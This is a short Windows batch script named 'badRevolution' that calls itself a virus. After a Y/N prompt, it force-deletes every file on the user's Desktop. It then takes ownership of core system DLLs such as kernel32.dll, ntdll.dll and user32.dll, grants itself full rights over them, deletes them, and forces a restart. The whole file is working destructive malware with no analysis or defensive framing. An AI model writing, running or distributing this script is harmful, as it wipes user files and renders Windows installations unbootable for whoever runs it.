@echo off 
title badRevolution 
echo. 
echo    This virus is no joke, do you wanna continue? 
echo. 
echo    Press Y or N to continue. 
echo. 
choice /c yn >nul
if %errorlevel% == 1 goto payload 
if %errorlevel% == 2 exit 
:payload 
cls 
cd C:\Users\%username%\
del Desktop\* /q /f
cd C:\Windows\System32
takeown /f "C:\Windows\System32\kernel32.dll"
icacls "C:\Windows\System32\kernel32.dll" /grant %username%:F
del kernel32.dll
takeown /f "C:\Windows\System32\user32.dll"
icacls "C:\Windows\System32\user32.dll" /grant %username%:F
del user32.dll
takeown /f "C:\Windows\System32\ntdll.dll"
icacls "C:\Windows\System32\ntdll.dll" /grant %username%:F
del ntdll.dll 
takeown /f "C:\Windows\System32\gdi32.dll"
icacls "C:\Windows\System32\gdi32.dll" /grant %username%:F
del gdi32.dll 
takeown /f "C:\Windows\System32\shell32.dll"
icacls "C:\Windows\System32\shell32.dll" /grant %username%:F
del shell32.dll 
takeown /f "C:\Windows\System32\advapi32.dll"
icacls "C:\Windows\System32\advapi32.dll" /grant %username%:F
del advapi32.dll 
shutdown -r -f 